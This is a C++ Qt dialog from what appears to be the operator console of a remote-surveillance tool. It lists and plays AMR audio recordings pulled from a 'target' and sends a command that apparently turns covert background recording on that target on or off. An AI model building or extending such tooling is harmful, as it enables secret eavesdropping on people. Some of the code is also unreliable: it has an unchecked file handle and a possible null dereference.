#include "recorddlg.h"

#include "AmrPlayer.h"

#pragma comment(lib, "AmrDecoder.lib")

#include "target.h"
#include "maindlg.h"
#include <Windows.h>
#include "Utility.h"

RecordDlg::RecordDlg(QWidget *parent, Target* tar)
	: QFrame(parent), m_tar(tar), m_amr(NULL)
{
	ui.setupUi(this);

	InitConnection();
	InitFileList();

	InitCustomText(this);
}

RecordDlg::~RecordDlg()
{
	if ( m_amr )
	{
		m_amr->Stop();
		delete m_amr;
	}
}

void RecordDlg::GetNewRecordFile( MSG* msg )
{
	std::wstring fileName = (PWCHAR)(msg->wParam);
	QTreeWidgetItem* item = new QTreeWidgetItem;
	item->setText(0, QString::fromStdWString(fileName.substr(fileName.rfind('\\'), fileName.length()-fileName.rfind('\\'))));
	item->setData(0, Qt::UserRole, QString::fromStdWString(fileName));

	HANDLE hf = CreateFileW(fileName.c_str(), FILE_GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD size = GetFileSize(hf, NULL);
	CloseHandle(hf);

	item->setText(1, QString("%1 KB").arg(size / 1024));
	ui.trRecordList->addTopLevelItem(item);
}

void RecordDlg::OnBtnSettingClicked()
{
	bool open = ui.chkOpen->isChecked();
	ULONG time = ui.spnStopInterval->value();
	FrmMain->ctrConn->Send_BACKSOUND(m_tar->dwTargetID, open, time);
}

void RecordDlg::OnBtnStopRecordClicked()
{
	StopPlaySound();
}

void RecordDlg::OnTrRecordListItemDoubleClicked(QTreeWidgetItem* item, int column)
{
	std::wstring filePath = item->data(0, Qt::UserRole).toString().toStdWString();
	StartPlaySound(filePath);
}

void RecordDlg::InitConnection()
{
	connect(ui.btnSetting, SIGNAL(clicked()), this, SLOT(OnBtnSettingClicked()));
	connect(ui.btnStopRecord, SIGNAL(clicked()), this, SLOT(OnBtnStopRecordClicked()));
	connect(ui.trRecordList, SIGNAL(itemDoubleClicked(QTreeWidgetItem*, int)), this, SLOT(OnTrRecordListItemDoubleClicked(QTreeWidgetItem*, int)));
}

void RecordDlg::InitFileList()
{
	std::wstring localDir = m_tar->widBackSoundPath;

	std::wstring findStr = localDir + L"\\*.amr";

	WIN32_FIND_DATA fd = {0};
	HANDLE hf = FindFirstFile(findStr.c_str(), &fd);

	if ( INVALID_HANDLE_VALUE == hf )
		return;

	do 
	{
		QTreeWidgetItem* item = new QTreeWidgetItem;
		item->setText(0, QString::fromStdWString(std::wstring(fd.cFileName)));
		item->setData(0, Qt::UserRole, QString::fromStdWString(localDir + L"\\" + fd.cFileName));

		std::wstring filePath = localDir + L"\\" + fd.cFileName;
		HANDLE hf = CreateFileW(filePath.c_str(), FILE_GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		DWORD size = GetFileSize(hf, NULL);
		CloseHandle(hf);

		item->setText(1, QString("%1 KB").arg(size / 1024));

		ui.trRecordList->addTopLevelItem(item);

	} while ( FindNextFile(hf, &fd) );

	FindClose(hf);
}

void RecordDlg::StartPlaySound(std::wstring file)
{
	if ( m_amr == NULL )
		m_amr = new AmrPlayer(this->winId(), file.c_str());
	else
		m_amr->Load(file.c_str());

	m_amr->Start();

	WCHAR text[1024] = {0};
	wsprintfW(text, L"ÕýÔÚ²¥·ÅÂ¼Òô : %s ...", file.substr(file.rfind('\\'), file.length()-file.rfind('\\')).c_str());
	ui.lbStatus->setText(QString::fromStdWString(std::wstring(text)));
}

void RecordDlg::StopPlaySound()
{
	m_amr->Stop();
	ui.lbStatus->setText(QString::fromLocal8Bit("Í£Ö¹²¥·ÅÂ¼Òô"));
}
